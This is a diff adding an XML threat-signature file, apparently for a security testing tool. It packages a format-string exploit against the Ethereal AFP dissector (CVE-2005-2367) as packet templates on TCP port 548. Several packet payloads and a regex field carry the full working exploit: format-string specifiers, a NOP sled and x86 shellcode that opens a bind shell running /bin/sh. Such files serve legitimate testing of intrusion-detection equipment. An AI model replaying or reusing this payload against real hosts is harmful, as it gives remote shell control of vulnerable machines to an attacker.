@@ -1,0 +1,193 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Ethereal AFP Dissector Format String Exploit"/>
+    <EngDesc display="true" value="This threat attempts to cause ethereal to run arbitrary code by exploiting a format string condition.  The format string vulnerability is located in Ethereal's AFP dissector.  The AFP protocol is typically sent over TCP port 548."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Crashing"/>
+      <item value="Implementation_Exploitation"/>
+      <item value="Unauthorized_Use"/>
+    </Intent>
+    <Protocol display="true" value="AFP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Sniffer"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Ethereal"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Ethereal"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Ethereal_0.10.11"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.idefense.com/application/poi/display?id=289&amp;type=vulnerabilities&amp;flashstatus=true"/>
+    <CVEID display="true" value="CVE-2005-2367"/>
+    <bugtraqID display="true" value="14399"/>
+    <OSVDB display="true" value="18388"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000001059ec47a6300c000a80001003c57088fae"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="high"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725888296562500"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="D"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X01\X06\X16\XD5\X00\X00\X00\X00\X00\X00\XFF\XFF\X00\X00\X00\X00\X00\X00\X00\X00\X01\X00\XED\X25\X2E\X31\X35\X30\X39\X39\X34\X36\X38\X38\X75\X25\X30\X24\X6E\X58\X40\XFF\XFF\X08\X40\XFF\XFF\X08\X40\XFF\XFF\X08\X40\XFF\XFF\X08\X40\XFF\XFF\X08\X40\XFF\XFF\X08\X40\XFF\XFF\X08\X40\XFF\XFF\X08\X40\XFF\XFF\X08\X40\XFF\XFF\X08\X40\XFF\XFF\X08\X40\XFF\XFF\X08\X40\XFF\XFF\X08\X40\XFF\XFF\X08\X40\XFF\XFF\X08\X40\XFF\XFF\X08\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X31\XC0\X50\X40\X89\XC3\X50\X40\X50\X89\XE1\XB0\X66\XCD\X80\X31\XD2\X52\X66\X68\X1F\X2B\X43\X66\X53\X89\XE1\X6A\X10\X51\X50\X89\XE1\XB0\X66\XCD\X80\X40\X89\X44\X24\X04\X43\X43\XB0\X66\XCD\X80\X83\XC4\X0C\X52\X52\X43\XB0\X66\XCD\X80\X93\X89\XD1\XB0\X3F\XCD\X80\X41\X80\XF9\X03\X75\XF6\X52\X68\X6E\X2F\X73\X68\X68\X2F\X2F\X62\X69\X89\XE3\X52\X53\X89\XE1\XB0\X0B\XCD\X80"/>
+    <Created value="1139461992" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="K"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="L"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="M"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="N"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+    <for index="B">
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+    <for index="C">
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+    <for index="D">
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+    <for index="E">
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+    <for index="F">
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+    <for index="G">
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+    <for index="H">
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+    <for index="I">
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+    <for index="J">
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0039" Identification="@random(0,FFFF)" FragmentOffset="0000" TTL="@random(70,80)" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="548" destPort="$destPort" SeqNumber="@random(0,FFFFFFFF)" AckNumber="@random(0,FFFFFFFF)" HeaderLength="05" WindowSize="2000" Checksum="" UrgentPointer="0000" Options="" Payload="FF02CAB700000000000000000000000010" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="B" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="012C" Identification="@random(0,FFFF)" FragmentOffset="0000" TTL="@random(70,80)" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="548" destPort="$destPort" SeqNumber="@random(0,FFFFFFFF)" AckNumber="@random(0,FFFFFFFF)" HeaderLength="05" WindowSize="2000" Checksum="" UrgentPointer="0000" Options="" Payload="0106CAB7000000000000FFFF00000000000000000100ED252E313530393934363838752530246E5840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF089090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909031C0504089C350405089E1B066CD8031D25266681F2B43665389E16A10515089E1B066CD8040894424044343B066CD8083C40C525243B066CD809389D1B03FCD804180F90375F652686E2F7368682F2F626989E3525389E1B00BCD80" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="C" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0039" Identification="@random(0,FFFF)" FragmentOffset="0000" TTL="@random(70,80)" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="548" destPort="$destPort" SeqNumber="@random(0,FFFFFFFF)" AckNumber="@random(0,FFFFFFFF)" HeaderLength="05" WindowSize="1000" Checksum="" UrgentPointer="0000" Options="" Payload="FF0216D500000000000000000000000010" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="012C" Identification="@random(0,FFFF)" FragmentOffset="0000" TTL="@random(70,80)" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="548" destPort="$destPort" SeqNumber="@random(0,FFFFFFFF)" AckNumber="@random(0,FFFFFFFF)" HeaderLength="05" WindowSize="1000" Checksum="" UrgentPointer="0000" Options="" Payload="010616D5000000000000FFFF00000000000000000100ED252E313530393934363838752530246E5840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF089090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909031C0504089C350405089E1B066CD8031D25266681F2B43665389E16A10515089E1B066CD8040894424044343B066CD8083C40C525243B066CD809389D1B03FCD804180F90375F652686E2F7368682F2F626989E3525389E1B00BCD80" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0039" Identification="@random(0,FFFF)" FragmentOffset="0000" TTL="@random(70,80)" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="548" destPort="$destPort" SeqNumber="@random(0,FFFFFFFF)" AckNumber="@random(0,FFFFFFFF)" HeaderLength="05" WindowSize="2000" Checksum="" UrgentPointer="0000" Options="" Payload="FF025CB000000000000000000000000010" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="F" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="012C" Identification="@random(0,FFFF)" FragmentOffset="0000" TTL="@random(50,80)" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="548" destPort="$destPort" SeqNumber="@random(0,FFFFFFFF)" AckNumber="@random(0,FFFFFFFF)" HeaderLength="05" WindowSize="1000" Checksum="" UrgentPointer="0000" Options="" Payload="01065CB0000000000000FFFF00000000000000000100ED252E313530393934363838752530246E5840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF089090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909031C0504089C350405089E1B066CD8031D25266681F2B43665389E16A10515089E1B066CD8040894424044343B066CD8083C40C525243B066CD809389D1B03FCD804180F90375F652686E2F7368682F2F626989E3525389E1B00BCD80" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="G" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0039" Identification="@random(0,FFFF)" FragmentOffset="0000" TTL="@random(70,80)" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="548" destPort="$destPort" SeqNumber="@random(0,FFFFFFFF)" AckNumber="@random(0,FFFFFFFF)" HeaderLength="05" WindowSize="1000" Checksum="" UrgentPointer="0000" Options="" Payload="FF02C6DD00000000000000000000000010" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="H" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="012C" Identification="@random(0,FFFF)" FragmentOffset="0000" TTL="@random(70,80)" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="548" destPort="$destPort" SeqNumber="@random(0,FFFFFFFF)" AckNumber="@random(0,FFFFFFFF)" HeaderLength="05" WindowSize="1000" Checksum="" UrgentPointer="0000" Options="" Payload="0106C6DD000000000000FFFF00000000000000000100ED252E313530393934363838752530246E5840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF089090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909031C0504089C350405089E1B066CD8031D25266681F2B43665389E16A10515089E1B066CD8040894424044343B066CD8083C40C525243B066CD809389D1B03FCD804180F90375F652686E2F7368682F2F626989E3525389E1B00BCD80" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="I" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0039" Identification="@random(0,FFFF)" FragmentOffset="0000" TTL="@random(50,80)" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="548" destPort="$destPort" SeqNumber="@random(0,FFFFFFFF)" AckNumber="@random(0,FFFFFFFF)" HeaderLength="05" WindowSize="1000" Checksum="" UrgentPointer="0000" Options="" Payload="FF02EA9B00000000000000000000000010" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="J" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="012C" Identification="@random(0,FFFF)" FragmentOffset="0000" TTL="@random(50,80)" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="548" destPort="$destPort" SeqNumber="@random(0,FFFFFFFF)" AckNumber="@random(0,FFFFFFFF)" HeaderLength="05" WindowSize="1000" Checksum="" UrgentPointer="0000" Options="" Payload="0106EA9B000000000000FFFF00000000000000000100ED252E313530393934363838752530246E5840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF0840FFFF089090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909031C0504089C350405089E1B066CD8031D25266681F2B43665389E16A10515089E1B066CD8040894424044343B066CD8083C40C525243B066CD809389D1B03FCD804180F90375F652686E2F7368682F2F626989E3525389E1B00BCD80" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
